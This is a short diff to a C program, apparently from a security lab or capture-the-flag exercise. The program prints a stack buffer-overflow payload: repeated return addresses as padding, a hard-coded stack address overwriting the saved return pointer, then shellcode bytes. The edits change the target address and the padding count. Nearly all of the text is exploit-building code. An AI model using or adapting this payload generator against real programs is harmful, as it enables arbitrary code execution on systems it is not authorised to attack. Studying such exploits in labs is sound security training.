@@ -7,14 +7,13 @@ int main(void){
     }
 
     // return to the return of main
-    int payload = 0x08048508;
+    int payload = 0x08048553;
     // 4 addresses padding before the return pointer
-    for(int bruteforce = 0; bruteforce < 45; bruteforce++){
+    for(int bruteforce = 0; bruteforce < 5; bruteforce++){
       for(int i = 0; i < 4 ; i++){
           printf("%c", ((char*)&payload)[i]);
       }
     }
-
     int finalreturn = 0xbffff7b0+4;
     for(int i = 0; i < 4 ; i++){
         printf("%c", ((char*)&finalreturn)[i]);
@@ -25,5 +24,6 @@ int main(void){
     for(int i = 0; i < strlen(shellcode); i++){
       printf("%c", (shellcode)[i]);
     }
+
     return 0;
 }
